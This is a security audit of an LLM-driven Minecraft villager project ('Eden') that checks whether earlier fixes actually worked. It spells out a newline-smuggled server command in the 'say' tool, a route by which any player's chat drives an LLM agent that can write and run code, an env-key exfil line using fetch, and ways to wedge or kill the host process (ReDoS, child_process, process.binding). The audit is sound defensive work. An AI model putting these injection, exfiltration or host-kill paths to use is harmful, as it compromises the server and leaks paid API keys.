# Eden — Deep RE-Review Findings (verification of the 2026-06-16 remediation)

Second-pass review against [REVIEW-FINDINGS.md](REVIEW-FINDINGS.md) and the `2026-06-16 — Deep review +
remediation` entry in [docs/PROGRESS.md](../docs/PROGRESS.md). Fanned out across the 8 original
workstreams (each agent re-read the **current** code, treating every claim + comment as a hypothesis to
verify), then a synthesis + adversarial-verify pass in which the cited code for every top finding was
re-read directly (trade contract vs the Java listener, the mineflayer chat-split, the env-scrub scope, the
`guardHostKillers` object identity, the reactive tool set). Baseline before review: `npm run check`
**green — 603 tests, 601 pass, 2 skipped, 0 fail**.

**Severity:** Critical = wedge/crash host, corrupt journal, exfil key. High = wrong verdicts / breaks loop
convergence / silently drops durable behavior / new RCE-or-storm surface. Medium = claim↔code drift on a
load-bearing invariant. Low/Nit. **Confidence:** Confirmed (code read/verified) vs Hypothesis (real-bot
behavior, not exercisable in CI).

## Headline

The remediation is **honest and competent where it acted.** The hard ones are genuinely closed: CRIT-1's
recursion/microtask wedge (function-body canary — a real fix, not a comment), CRIT-2's `process.*`
host-kill on the live object, MED-1/2a/4/5/8/9/14 and the LOW cluster all verify CONFIRMED-CLOSED. One
review seed (`MED-5` hash compare) was re-checked byte-for-byte and is correct.

But three things mar it, and they cluster — predictably — at the **fakes↔real seam** and at the **widened
attack surface**:

1. **HIGH-4 "wired social live" activated a path that has never worked against the real mod.** The
   settlement POST uses the wrong field names (`{from,to,give,want}` vs the Java `{botA,botB,aGives,bGives}`)
   → HTTP 400 on every real trade. CI is green because the new `FakeSettlement` validates nothing. This is
   the canonical W/Z/C/E signature, freshly minted by the fix pass.
2. **The new security boundaries are real but porous in their seams.** `say`'s `/`-strip (and its SECURITY
   test) check only the *leading* character, but mineflayer splits chat on `\n` — so `say("hi\n/pray …")`
   emits a command. The env-scrub deletes only the *active* key, but `loadEnvFile` loads *every* key in
   `api-keys.env`. The host-kill guard works but is untested on the real `process`.
3. **HIGH-3 widened the still-open CRIT-4** from "needs admin/directive" to "any nearby player's chat
   line" — the reactive `player-chat → deliberate` reflex now ships the full `write_skill`/`run_skill` tool
   set. The remediation did not introduce the RCE, but it materially enlarged its ingress.

20 of the 21 claimed fixes verify closed or partial-as-documented; the exceptions and the new sweep
findings follow.

---

## (1) Regressions / incorrectly-applied fixes from the remediation pass

### REG-1 — [High] Trade settlement POST body field names don't match the Java `:8767` contract → every live trade 400s; the fake hides it
- **Location:** `src/social/trade.ts:74-79` (POST body) + `tests/fakes/fake-settlement.ts:67-75` (fake) vs `src/main/java/com/paul/brawl/VillageHttpListener.java:63-68,156-160` (the real contract).
- **Claim:** HIGH-4 banner — "wired the social subsystem live … settlement failure surfaced not swallowed"; trade.ts:1-7 header — "POSTs a typed offer to the mod … re-validates + swaps".
- **Reality:** `SettlementClient.settle` sends `{ from, to, give:[…], want:[…] }`. The Java `TradeRequest` (Gson) deserializes `{ botA, botB, aGives, bGives }`; Eden's keys match no field, so all four stay `null`, `validateShape` returns `"missing botA"` (VillageHttpListener.java:158) → **HTTP 400** before `executeTrade` is ever reached. `FakeSettlement.handle` JSON-parses any body and returns the canned `{ok:true}` (fake-settlement.ts:72-74), and `social-trade.test.ts` asserts only the Eden-side names — so the fake mirrors Eden's wrong shape and CI can never see the break. The `{item,count}` line shape *does* match Java `ItemSpec`; only the four top-level names are wrong.
- **Impact:** HIGH-4's headline feature (live trade settlement) is **100% non-functional against the real mod** — a villager that calls `propose_trade` always gets `trade.failed "settlement HTTP 400: missing botA"`. It fails *loud* (a `trade.failed` is journaled, inventories untouched — no silent divergence), so this is High, not Critical by the host/journal/key rubric. (Both the bots/fakes and the social/admin agents independently flagged this as "Critical"; re-calibrated down here because there is no host/journal/key impact — but it is the single most consequential defect the remediation introduced.)
- **Confidence:** Confirmed (both sides read line-by-line).
- **Fix sketch:** map to the Java contract in `settle()`: `{ botA: offer.from, botB: offer.to, aGives: offer.give.map(resolveItem), bGives: offer.want.map(resolveItem) }` (Eden `want` = what `to`/botB gives back = `bGives`). Then port `validateShape` into `FakeSettlement` (reject a body missing `botA/botB/aGives/bGives` with 400) so CI catches this class, and update `social-trade.test.ts` to the real names.

### REG-2 — [High] `say`'s `/`-command strip (and its SECURITY test) check only the leading char; mineflayer splits chat on `\n`, so a newline emits a command
- **Location:** `src/main.ts:647` (`const line = /^\s*\//.test(text) ? '' : text;` then `bot.chat(line)` at :651/:663); duplicate strip `src/villagers/tools.ts` say-tool guard; mineflayer `node_modules/mineflayer/lib/plugins/chat.js:158` (`message.split('\n').forEach(sub => bot._client.chat(sub))`).
- **Claim:** main.ts:645-646 — "SECURITY: never let 'speech' be a `/`-command"; the passing test `HIGH-4 (SECURITY): say STRIPS/REJECTS a leading "/" — no command emission from chat input`.
- **Reality:** `/^\s*\//` anchors only the start of the whole string. `say({ text: "Bonjour\n/pray donne-moi des diamants" })` passes the strip (starts with "Bonjour"), then `bot.chat(...)` splits on `\n` and sends `/pray …` as a separate command line. There is no `\n`/`\r` sanitization on the `say`→`bot.chat` path. Villagers are mortal (never op'd), so `/op` no-ops — but **permission-0 commands on this very server execute**: `/pray` (invokes the Java God), `/accept` (accepts a pending trade), `/msg`/`/me`. The test only asserts a *leading*-slash rejection, so the fix is narrowed to the test, not the bug.
- **Impact:** the stated "a `/` can never be a command" guarantee is false; a villager — or, via REG-3/CRIT-4, a chat-injected villager — can emit perm-0 server commands by embedding `\n/cmd` after benign text. A cross-subsystem footgun (`/pray`, `/accept`).
- **Confidence:** Confirmed (Eden strip + mineflayer split both read).
- **Fix sketch:** reject/strip on ANY line: `if (/(^|\n)\s*\//.test(text)) return { ok:false, … }`, or split on `\n` and drop any subline whose trim starts with `/` before `bot.chat`. Apply at main.ts:647 AND the tools.ts guard (and hardening.ts:138, which has the same first-line-only flaw). Add a test with an embedded-newline command.

### REG-3 — [High] HIGH-3 widened the still-open CRIT-4: an untrusted player's chat now drives a deliberation with `write_skill`/`run_skill`
- **Location:** `src/bots/signals.ts:124-129` (native `chat`→bus), `src/villagers/events.ts` (`chat`→`player-chat` when `!isVillager`), `roles.json:20` (`player-chat within:8 → deliberate`), `src/main.ts:811` (reactive wakeup `toolNames: brain.toolNames()` — the FULL set).
- **Claim:** banner — "HIGH-3 bridged the dead reactivity signals (… player-chat … were inert)"; CLAUDE.md "Reactivity now active for ALL live scenarios."
- **Reality:** before HIGH-3 the `player-chat → deliberate` reflex was inert (signals never bridged native `chat`), so reaching `write_skill` required admin `/prompt` or a God directive. signals.ts now bridges `chat`/`whisper` onto the bus; a player line (`isVillager:false`) maps to `player-chat`; roles.json wakes a `deliberate`; main.ts:811 hands that deliberation `brain.toolNames()` — which includes `write_skill`/`run_skill`. So any player who types within 8 blocks of a villager drives an LLM deliberation that can author + run arbitrary in-process code *before any verdict*. The own-line guard (`from === bot.username`, signals.ts:127) and the `isVillager` tag (peer speech → `villager-chat`, unsubscribed by default) correctly prevent villager↔villager loops — so HIGH-3 itself is storm-clean; the issue is purely the widened *external* ingress.
- **Impact:** CRIT-4's reachability went from "operator-only" to "remote-ish (any chat-capable player near a villager)." CRIT-3 now blocks the active-key exfil and CRIT-2 blocks `process.exit`, but `fetch`-exfil of any data, OS-kill via `import('node:child_process')`, the CRIT-1 native-call wedge (ReDoS on the player's own `text`), and command-emission via REG-2 all remain reachable from a single chat line.
- **Confidence:** Confirmed (every hop read in the new code).
- **Fix sketch:** gate `player-chat` to **data-only** by default — let the reflex answer via `say` but withhold `write_skill`/`run_skill` from reactive `player-chat` wakeups (require a directive to enter authoring); or make this an explicit written risk decision before any untrusted player is in range. (Full closure = worker isolation, tracked with CRIT-1.) See §4 CRIT-4.

### REG-4 — [Medium] CRIT-3 env-scrub is incomplete: only the active key + `OPENAI_API_KEY` are deleted, but `loadEnvFile` loads every key in `api-keys.env`
- **Location:** `src/main.ts:252-253` (`delete process.env[config.apiKeyEnv]; delete process.env['OPENAI_API_KEY']`) vs `src/providers.ts:71-82` (`loadEnvFile` writes every `KEY=value` line into `process.env`; its own comment at :67-68 names `DEEPSEEK_API_KEY`).
- **Claim:** main.ts:246-247 — "Deleting only the specific key var(s) after capture closes that exfil path."
- **Reality:** the scrub removes exactly two names. `loadEnvFile` loads *all* keys from `eden/api-keys.env` (the file the host reads on a direct boot, mirroring the live-test harness — multi-provider files are expected per R56). If the active provider is OpenAI but the file also holds `DEEPSEEK_API_KEY` (or any third provider/ambient secret), that key survives in `process.env` and remains exfiltrable via `globalThis.process.env` from skill code. The security agent confirmed a second key is visible to a compiled skill by probe.
- **Impact:** conditional paid-key exfil — closed for the active key, open for any *other* secret in `api-keys.env` or the ambient environment. Under a single-key `api-keys.env` (active key only) the scrub is effectively complete, so this is Medium, not Critical — but the comment's "closes that exfil path" overstates completeness.
- **Confidence:** Confirmed.
- **Fix sketch:** scrub all secret-shaped vars after capture, reusing the journal-redaction predicate already trusted at main.ts (the `/key|secret|token|password/i` test): `for (const k of Object.keys(process.env)) if (/key|secret|token|password/i.test(k)) delete process.env[k];`. Correct the comment.

### REG-5 — [Low] The two load-bearing security fixes (`guardHostKillers`, env-scrub) have zero real-path test coverage
- **Location:** `tests/main.test.ts` (boots with `installProcessGuards` unset; `guardHostKillers` test passes an injected `target` literal, never the default `process`).
- **Reality:** the scrub branch (main.ts:251, gated on `installProcessGuards && wiring`) never runs in CI, and the `guardHostKillers` test exercises only the loop-over-`DENIED_PROCESS_METHODS` mechanics on a fake object — never the load-bearing assertion that reassigning `process[m]` actually intercepts `globalThis.process.exit()`. Both fixes are correct today (verified by reading), but a future refactor (frozen `process`, wrong-object patch, scrub-before-capture) would pass CI while silently re-opening the host-kill / key-exfil vector.
- **Impact:** the security spine can rot undetected.
- **Confidence:** Confirmed.
- **Fix sketch:** one real-process test — `const r = guardHostKillers(journal); assert.throws(() => (globalThis.process as any).reallyExit(0), SkillForbiddenError); r();` (use `reallyExit`, harmless when restored). And a scrub test: set `process.env.OPENAI_API_KEY='x'`, boot with a fake provider + `installProcessGuards:true`, assert `process.env.OPENAI_API_KEY === undefined` after boot AND that an injected `fetchImpl` still saw `Authorization: Bearer x`.

### REG-6 — [Low] HIGH-1 `captureSnapshot` omits players from the critic's world delta (keys on `e.name` only)
- **Location:** `src/skills/engine.ts:687` (`if (!e || !e.name || !e.position) continue;`) — inconsistent with `src/bots/signals.ts:171` (`e.name ?? e.username ?? 'entity'`).
- **Claim:** HIGH-1 banner — "captureSnapshot now populates time/entities/blocks/equipment (critic no longer judges an empty world)."
- **Reality:** real mineflayer player entities expose `username`/`type`, not `name`, so `readNearbyEntities` silently skips every player. The critic's "nearby entities" delta therefore still shows a dead scene for any task whose effect is "a player appeared/left" (or any villager — villagers are players too). The fix populates mobs/items but not the most judgment-relevant actors, and the codebase is internally inconsistent (the signal poll handles `username`; the snapshot doesn't). The FakeBot only models `name`, so CI can't catch it (W/Z/C/E class).
- **Impact:** narrower than the original HIGH-1 stub, but a real residual blind spot exactly where social/defend/trade verdicts need it.
- **Confidence:** Confirmed at code level (real entity shape is Hypothesis-from-knowledge, but the `signals.ts` inconsistency proves the author already knows `username` exists).
- **Fix sketch:** `const label = e.name ?? e.username ?? e.type; if (!label || !e.position) continue;` and teach FakeBot a `username`-only entity so a test pins it.

---

## (2) New findings (full-codebase sweep)

### NEW-1 — [High] HIGH-5 combat path is un-remediated and entirely dead in CI (the least-proven live surface)
- **Location:** `src/skills/exemplars/index.ts:357` (`kill-mob`: `bot.entity.position.distanceTo(e.position)`, `bot.pvp.attack`, `target.isValid`), `:383-392` (`shoot-mob`: `.distanceTo`, `position.offset`, `entity.height`, `lookAt`, `activateItem`); `tests/fakes/fake-bot.ts:144` (`pvp = { stop }` only — no `attack`), seeded entities have no `isValid`/`height` and a plain-object `position`.
- **Claim:** HIGH-5 was **not** in the remediation banner's "fixed" list — so it is correctly still-open; flagged here as the highest-risk *unproven* path now that combat scenarios (`cooperative-mob-defense`, `detect-and-defend`) are live.
- **Reality:** `kill-mob`/`shoot-mob` are the only stock skills still using `bot.entity.position.distanceTo` instead of `Math.hypot` (the rest of the library was migrated per project memory; `defend-self` uses manual `Math.sqrt`). FakeBot's `pvp` has no `attack`, entities lack `isValid`/`height`, and `position` is a plain object with no Vec3 methods — so `kill-mob`/`shoot-mob`/`defend-self` bodies are **never executed** in any test (`skills-exemplars.test.ts` only parse-compiles; `loop-integration.test.ts` only checks `defend-self` is *retrieved*). Every assumption about `pvp.attack`'s signature, `isValid` semantics, and Vec3 `.offset`/`.height` is unvalidated.
- **Impact:** the richest live scenarios carry the most unmodeled real surface; a wrong API assumption surfaces only on a paid live run.
- **Confidence:** Confirmed at code level; live failure is Hypothesis.
- **Fix sketch:** rewrite `kill-mob`/`shoot-mob` distance with `Math.hypot` (so they survive a plain-object entity); add a FakeBot `pvp.attack(target)` that flips `target.isValid=false` after N ticks, give seeded entities `isValid`/`height`/a Vec3-like position, add `lookAt`/`activateItem`/`deactivateItem` recorders, and write one test that runs `defend-self`→`kill-mob` to a kill.

### NEW-2 — [Medium] Load-bearing mineflayer plugins (pvp, armorManager) are not asserted present after load; the fake hardcodes them
- **Location:** `src/bots/plugins.ts:62-80` (a failed `loadPlugin` only `warn`s, R16); `tests/fakes/fake-bot.ts:90-146` (hardcodes working `pvp`/`armorManager`/`autoEat`).
- **Claim:** plugins.ts header — "one failed plugin logs and is skipped so the bot stays online" (framed as graceful, not as a silent capability hole).
- **Reality:** if `mineflayer-pvp` or `mineflayer-armor-manager` throws on a 1.21.1 mismatch, `bot.pvp`/`bot.armorManager` stay `undefined` and nothing post-load asserts they attached. `armorManager?.pause()` (engine hardening, R3) then silently no-ops; combat skills throw on `undefined.attack`. The fake always has them, so CI never sees the absent case.
- **Impact:** a combat-plugin load failure degrades silently to a warn; the R3 "pause armor-manager around multi-click" invariant is lost invisibly — the W/Z/C/E signature.
- **Confidence:** Confirmed (no presence assertion; fake hardcodes).
- **Fix sketch:** after the load loop, journal a `system.error` (not warn) if `bot.pvp`/`bot.armorManager`/`bot.collectBlock` is undefined; add a test injecting a throwing plugin that asserts the error is journaled.

### NEW-3 — [Medium] `journal.retentionDays` is parsed and wired but never consumed — the journal grows unbounded
- **Location:** `src/config.ts:345,358` (MED-12 config half: key whitelisted + value read, not hardcoded) vs `src/journal/journal.ts` (no `DELETE`/prune) and `src/main.ts` (no pruner). Grep for `DELETE FROM journal`/`prune` across `eden/src` returns nothing.
- **Claim:** banner — "MED-12 `journal.retentionDays` wired."
- **Reality:** the config drift is genuinely fixed (no more false "unknown key" warning; the value is read through). But there is no consumer — the documented 7-day retention is a no-op and the journal table grows without bound on a long-lived host. The `kinds.ts` "windowed high-volume kind (Retention)" comments describe a mechanism with no implementation.
- **Impact:** unbounded DB growth on a real soak; the configured retention silently does nothing. Not a parity/correctness bug (views fold the full stream fine), an ops/durability gap.
- **Confidence:** Confirmed.
- **Fix sketch:** add a boot/daily pruner reading the now-wired `retentionDays` (`DELETE FROM journal WHERE at < ? AND kind IN (<windowed kinds>)`), or mark retention explicitly deferred so the config key isn't misleading.

### NEW-4 — [Low] CRIT-2 residual scope under-states: `process.binding` is a denylist gap, not just a worker-isolation residual
- **Location:** `src/skills/instrument.ts:60` (`DENIED_PROCESS_METHODS` = 4 methods, frozen); `src/main.ts:1381-1383` (residual comment names only `child_process`/fs).
- **Reality:** `process.binding` is reachable in skill scope (`typeof globalThis.process.binding === 'function'`, probe-confirmed by the security agent) and `guardHostKillers` doesn't touch it — `process.binding('spawn_sync')` is a documented route to native modules that sidesteps both the require-shim and the host-killer guard. The CRIT-2 residual comment lists only `child_process`/fs.
- **Impact:** the honestly-scoped residual is slightly less complete than the comment implies.
- **Confidence:** Confirmed.
- **Fix sketch:** name `process.binding` (and dynamic `import('node:child_process')`) in the residual comment; true closure is worker isolation.

### NEW-5 — [Low] Rate-capped reactive wake-ups are dropped without a journal record
- **Location:** `src/main.ts:817-819` (catch → `logger.warn`), `src/llm/scheduler.ts:113-114` (rejects `RateCappedError`).
- **Reality:** a non-bypass reactive wake-up that trips the per-villager minute rate cap rejects; main.ts catches and only `logger.warn`s — no `subscription.suppressed`/`system.note` is journaled. Coalescing + the cap correctly prevent a storm, but the dropped reflex is invisible to the journal/replay (same blind-spot class as MED-8).
- **Impact:** under an inbox/chat/entity burst a villager silently stops reacting for the rest of the minute with no journal trail; P4 ("everyone journals; the owner escalates once") is violated for this drop.
- **Confidence:** Confirmed (path); burst frequency is Hypothesis.
- **Fix sketch:** on `RateCappedError`, append a `subscription.suppressed`-style event naming villager + kind, not only `logger.warn`.

### NEW-6 — [Low] Website mis-domains the two new `subscription.enabled`/`disabled` kinds (S8 lockstep drift)
- **Location:** `website/api.js:31` (`KIND_DOMAINS.reactivity` omits both) and `website/ui.js:56-113` (`eventMsg` has no case).
- **Reality:** `kinds.ts:60-61,219-220` added the kinds (LOW-8 fix); the website wasn't updated. `domainOf` falls through to `'subscription'.split('.')[0]` = `'subscription'` (not in `DOMAIN_CLASS` → `k-unknown` badge, excluded from the reactivity facet); `eventMsg` hits the generic default. No crash (PROGRESS predicted "graceful-degrades"), but mis-faceted + no human summary.
- **Impact:** cosmetic; the two reactivity events don't colour/filter under reactivity.
- **Confidence:** Confirmed.
- **Fix sketch:** add both kinds to `KIND_DOMAINS.reactivity` (api.js) and two `case` arms in `ui.js` `eventMsg`.

### NEW-7 — [Low] LOW-1 `?ref=` narrowing silently returns empty for non-indexed ref keys
- **Location:** `src/journal/journal.ts:110-118` (now ORs only `rolloutId`/`runId`/`skill`); codified by `journal.test.ts`.
- **Reality:** the LOW-1 fix narrowed `?ref=` from "any ref value" (old `json_each` full-scan) to exactly three indexed keys. A `GET /journal?ref=<taskId|directiveId|conversationId|tradeId|…>` now returns empty rather than the events carrying it. Current callers (skill, rolloutId) are safe, but the behavior change is undocumented at the admin `?ref=` boundary.
- **Impact:** a future "show everything tagged with this taskId" query silently returns nothing.
- **Confidence:** Confirmed.
- **Fix sketch:** document the 3-key subset on the admin `?ref=` param; add an index + OR-term in lockstep if taskId lookups are later wanted.

### NEW-8 — [Low] MED-2 residual: probation still graduates on clean engine exits, never re-judged
- **Location:** `src/skills/engine.ts:436-446` + `src/skills/library.ts:176-188` (`recordProbationRun(name, outcome.ok)`).
- **Reality:** MED-2a closed the *admission* coupling (a `{success:false}` verdict can no longer admit), so a skill needs one genuine critic success to *enter* probation. But graduation active-probation→active is still 3 clean engine exits (didn't-throw), not 3 critic verdicts (the D-12 re-review rail is documented-deferred). Chained with the still-partial HIGH-1 snapshot (REG-6), a skill admitted on one success that then no-ops cleanly 3× graduates to `active` and becomes a village-wide composition dependency.
- **Impact:** bounded (entry requires a real success), but "completion ≠ progress" is not enforced at graduation.
- **Confidence:** Confirmed (mechanism); harmful-graduation chain depends on HIGH-1 remaining partial.
- **Fix sketch:** as documented — re-judge on the Nth probation run, or require probation runs to be verdict-successful (thread the verdict into `recordProbationRun`).

### Minor / Nit (Confirmed, low value)
- **[Nit]** `readEquipment` (engine.ts) reads `bot.inventory.slots[5..8]`, which FakeBot does not model (`inventory = { items() }` only) — the HIGH-1 equipment read is untested and the armor-slot indices unverified; degrades-to-`[]` on the missing field, re-creating an empty scene without failing.
- **[Nit]** `captureSnapshot` `worldAfter` runs an unbudgeted synchronous `findBlocks` + up to 96 `blockAt` calls after *every* run, including right after a stall-abort (bounded, but a synchronous burst at the worst moment).
- **[Nit]** MED-7 `combineDesks` is still dead config (parsed in config.ts/scenario-loader.ts, zero readers in `god/**`/`main.ts`) — correctly never claimed fixed, noted for completeness.
- **[Nit]** LOW-4 (`pause`/`resume` overload `system.config-warning`) still present (never claimed fixed).

---

## (3) Verification table — every claimed fix

| Finding | Claim (banner) | Verdict | One-line basis |
|---|---|---|---|
| **CRIT-2 / R77** | partial — `guardHostKillers` neuters `process.*` | **CONFIRMED-CLOSED** (residual under-named, untested) | patches the live `process` obj (main.ts:1389 default `target=process`); all aliases hit it; OS-kill residual honest but omits `process.binding` (NEW-4); no real-path test (REG-5) |
| **CRIT-3** | env-scrub closes key exfil | **PARTIAL** | active key + `OPENAI_API_KEY` deleted (main.ts:252-3); other `api-keys.env`/ambient secrets survive (REG-4) |
| **HIGH-1** | captureSnapshot populates world | **CONFIRMED-CLOSED** (with REG-6 player gap) | reads time/entities/blocks/equipment, all try/guarded, bounded; but entity-keying omits players, no assertion coverage |
| **HIGH-2** | bounded rendering + over-budget warning | **CONFIRMED-CLOSED** (observe-only) | `renderRunReport` field caps + `client.ts` over-budget journal warn; the request budget itself is still not *enforced* (MED-3 open, by design) |
| **HIGH-3** | reactivity signals bridged | **CONFIRMED-CLOSED** (storm/loop/teardown clean) **— but widened CRIT-4** | entity poll edge-deduped, chat self/peer-loop blocked, timers unref'd+cleared on detach; widens external RCE ingress (REG-3) |
| **HIGH-4** | social wired live | **PARTIAL** | `say`/`propose_trade` tools + relations/R69 wired & journaled; but settlement 400s on real (REG-1) + `say` newline injection (REG-2) |
| **HIGH-6** | admin loopback posture documented | **CONFIRMED-CLOSED as DOC-ONLY** | no token/Origin/CSRF check (doc comment only); `readBody` 64 KB cap (LOW-3) + LOW-2 existence-check both present; `/prompt`→RCE amplifier persists (documented) |
| **MED-1** | recursive arg/return validation | **CONFIRMED-CLOSED** | `validateValue` recurses object `properties`+`required`, array `items`, `enum`; path-qualified errors (claim didn't include min/max/additionalProperties — those remain shallow) |
| **MED-2a** | admit↔success critic rail | **CONFIRMED-CLOSED** | critic forces `keep-draft` on `!success && admit`, runs last, can't be bypassed by unknown actions (coerced to keep-draft) |
| **MED-2b** | "re-judged" claim corrected | **CONFIRMED-CLOSED** (comment==code) | both engine + library now say graduation counts clean exits; re-review rail explicitly deferred (residual = NEW-8) |
| **MED-4** | `verifyHashes()` called at boot | **CONFIRMED-CLOSED** | invoked main.ts:582, after seed, before engine; drift quarantines (not just logs); never throws |
| **MED-5** | idempotent stock-skill seed | **CONFIRMED-CLOSED** | `seedStock` no-ops when `newest.codeHash === sha256(code)` AND status matches; byte-for-byte compare, no normalization gap → no regrowth, no genuine-change skip |
| **MED-6** | QA-cache "persisted" claim corrected | **CONFIRMED-CLOSED** (comment==code) | comment now says in-memory/resets on restart; genuinely not persisted (D-16 Phase-3 deferral) |
| **MED-8** | failed LLM calls journaled | **CONFIRMED-CLOSED** | one `llm.call` with finishReason timeout/error before re-throw; no double-journal; 0-token failure never counted as spend (budget only spends on success) |
| **MED-9** | `brain.done` guaranteed in `finally` | **CONFIRMED-CLOSED** | try/catch/finally; `done` appended only in finally (single append on every path); throw re-raised after |
| **MED-12** | `retentionDays` wired | **PARTIAL** | config half closed (key whitelisted + read), but no pruner consumes it → unbounded growth (NEW-3) |
| **MED-14** | orchestrator forces `tool_choice` | **CONFIRMED-CLOSED** | forced when `task` present; the no-task survey path preserves `auto` (zero directives still legitimate) |
| **LOW-1** | `?ref=` hits json_extract indexes | **CONFIRMED-CLOSED** | EXPLAIN shows MULTI-INDEX OR over the 3 indexes; fold parity unaffected (narrowing side-effect = NEW-7) |
| **LOW-2** | quarantine existence-check before append | **CONFIRMED-CLOSED** | admin existence check now precedes the journal append (no phantom `version:-1`) |
| **LOW-3** | `readBody` size cap | **CONFIRMED-CLOSED** | 64 KB → 413 |
| **LOW-5** | JSON parse errors name the file | **CONFIRMED-CLOSED** | config.ts/scenario-loader.ts/providers.ts all wrap with the path |
| **LOW-8** | `subscription.enabled/disabled` journaled (2 new kinds) | **CONFIRMED-CLOSED** | `setEnabled` journals the flip (no-op guard); kinds registered + handled by all five view folds (early-return, no crash); website graceful-degrades but mis-domains (NEW-6) |
| **LOW-6 / LOW-7** | dead param removed / `pool.start()` rejections logged | **NOT RE-VERIFIED** this pass (low value; trust prior) | — |

**Fold parity** (live fold == `rebuild-stats` replay) re-verified across all five views after the changes — holds (both fold `journal.query()` in append-order; the two new kinds never match a fold branch). **Lag monitor / R44** re-confirmed (armed at construction, fires on `max≥1000ms`, pulses stay in-memory). **CRIT-1 recursion fix** independently verified working (see §4).

---

## (4) Re-characterization of the still-open Criticals

### CRIT-1 — host-wedge: **recursion/microtask class CLOSED; native-call class OPEN** (the banner over-states it as wholly open)
The R75 lesson **was** built, contrary to the banner's "loop-budget canary only covers loop bodies … never built." `instrument.ts` now injects a count-free `__fnTick()` at the top of every `FunctionDeclaration`/`FunctionExpression`/`ArrowFunctionExpression` body (not just loop bodies), wired to the macrotask heartbeat in `engine.ts`. The engine suite confirms: `async f(n){ await Promise.resolve(); return f(n+1); }` and a `.then`-trampoline both abort as `stalled`, while a genuine 2.7M-call `fib(30)` is **not** false-aborted (the canary is count-free). **Residual (Confirmed):** a single *synchronous native call* with no JS re-entry — `/^(a+)+$/.test(args.text)` (ReDoS), `Buffer.alloc(2**40)`, `Atomics.wait(...)`, `new Array(1e9).fill()` — ticks no canary and starves the macrotask heartbeat, wedging the single host with no in-process abort. **The ReDoS variant is now the worst case because `args.text` can originate from player chat (REG-3).** **Did remediation worsen it?** No — strictly improved (recursion class closed). The banner should be updated to say recursion is closed and only the native-call class remains (worker isolation is the only fix).

### CRIT-2 — `process.*` host-kill: **CLOSED on the live object; OS-kill residual OPEN and honest (minus `process.binding`)**
`guardHostKillers` reassigns `exit/reallyExit/abort/kill` on the real `process` (main.ts:1389); `globalThis.process`, `require('process')`, and `new Function('return process')()` all resolve to the same object, so every alias is neutralized; a deferred `setTimeout(()=>process.exit())` is caught (guard installed before any skill runs) and lands on the `uncaughtException` handler. Breaks no host path (the host uses `process.exitCode`; pm2 uses external SIGTERM). **Residual (Confirmed):** OS-kill via `import('node:child_process').spawn('taskkill',…)` and fs writes remain — honestly named in the comment, but `process.binding` (NEW-4) is *not* named and is reachable. **Did remediation worsen it?** No — strictly improved; the `process.*` claim the D-08 test asserts now actually holds. Caveat: the real-process path is untested (REG-5).

### CRIT-3 — key exfil: **active key CLOSED; other env secrets OPEN** (a false sense of completeness)
The active provider's key + `OPENAI_API_KEY` are deleted from `process.env` after the client captures them into a private field; the client keeps working from the captured copy; real-boot-gated so tests/eval are unaffected. **Residual (Confirmed, REG-4):** `loadEnvFile` loads *every* key in `api-keys.env`, so a non-active provider key (`DEEPSEEK_API_KEY`) or any ambient secret survives and is exfiltrable via `await fetch('…?k='+globalThis.process.env.DEEPSEEK_API_KEY)`. **Did remediation worsen it?** No — it closed the worst single path, but the comment's "closes that exfil path" implies a completeness the 2-name scrub doesn't have. Fix is a 3-line regex scrub (REG-4).

### CRIT-4 — chat→`write_skill`→`run_skill` RCE: **INTACT and WIDENED by HIGH-3** (the key re-characterization)
Every hop verified in the new code: player chat → `signals.ts` → `player-chat` event → `events.ts` `renderTrigger = JSON.stringify(event)` (unsanitized) → context-pack §2 → reactive deliberation with the **full** `write_skill`/`run_skill` tool set (main.ts:811) → arbitrary in-process code that runs *before* any verdict and can still `return {ok:true}`. **What the remediation defanged:** host-kill via `process.exit` (CRIT-2) and active-key exfil (CRIT-3). **What remains open:** `fetch`-exfil of any data (world state, journal, other env secrets), OS-kill via `import('node:child_process')`, the CRIT-1 native-call wedge (ReDoS on the attacker's own `text`), and command-emission via the `say` newline bypass (REG-2). **Did remediation worsen it? YES** — HIGH-3 turned the previously-inert `player-chat → deliberate` reflex into a live, untrusted, remote-ish ingress: before, reaching `write_skill` needed admin `/prompt` (HIGH-6, still unauthenticated) or a God directive; now any player typing within 8 blocks of a villager drives an authoring-capable deliberation. The amplification sub-risk (villager↔villager `say` loop) is correctly bounded by the own-line/`isVillager` guards. **The written posture must now say: do not expose Eden villagers to untrusted players, and do not expose :8770 beyond a single trusted user — and the `player-chat` reflex should be data-only (no authoring tools) until skill execution is worker-isolated.**

---

## Areas re-verified clean (a clean check is a result)

- **CRIT-1 recursion fix is genuine** — function-body canary covers all three function node types; deep finite recursion not false-aborted (count-free); microtask/`.then`-trampoline aborts.
- **Engine timer cleanup + R4/R5 abort order intact after the fixes** — the new gap-W heartbeat interval is cleared in the same `finally` as the other four timers; abort sequence unchanged; no new catch swallows the abort signal.
- **HIGH-3 reactivity is storm-clean** — entity poll is edge-deduped by id (one `entitySpotted` per entry, one `entityGone` per leave); chat self-loop blocked (`from===username`) and peer speech tagged `villager-chat` (unsubscribed by default); poll timer `unref`'d + `clearInterval`'d on detach; inbox reflex excludes God directives (no storm).
- **MED-8/9 journaling correct** — exactly one `llm.call` per call (success or failure), no double-journal, failures never counted as spend; `brain.done` exactly once via `finally` with the error re-raised.
- **Fold parity + lag monitor + R44** — all hold after the changes; views early-return on the two new kinds (no fold crash).
- **D-16 vector memory (new code)** — upsert = delete-then-insert in a txn; trim-delete routed through the same `pendingVectors` FIFO (orphan-vector race closed); recall degrades to the keyword floor on any store failure (never throws); native dep gated so CI never loads it.
- **MED-5 hash compare** — byte-for-byte `sha256(input.code)` vs stored `codeHash`; no normalization mismatch (won't regrow) and no over-broad skip (won't drop a genuine change).
- **Tier gate, library status machine, retrieve divine-invisibility, curriculum-sole-ledger-writer (S2), MED-2a rail** — all intact; the remediation broke no transition.
- **Faithful fakes (credit where due)** — the R76 `findBlocks` palette pre-check, the R55 `activateBlock` server-confirm delay, the registry Proxy/`unknownItems` miss, click-window routing, and the `signals.ts` poll math (`Math.sqrt`/plain-object, correctly avoiding Vec3 methods) all model reality well.

---

## Suggested fix order

1. **REG-1 trade contract** (3-line field remap + make the fake validate) — the headline functional break the remediation introduced; cheap and total.
2. **REG-2 `say` newline strip** + **REG-3/CRIT-4 make `player-chat` data-only** — close the two ingress widenings the remediation opened (command emission + authoring-from-chat).
3. **REG-4 complete the env-scrub** (regex over all secret-shaped vars) and **REG-5 add the two security tests** — finish CRIT-3 and stop the spine rotting.
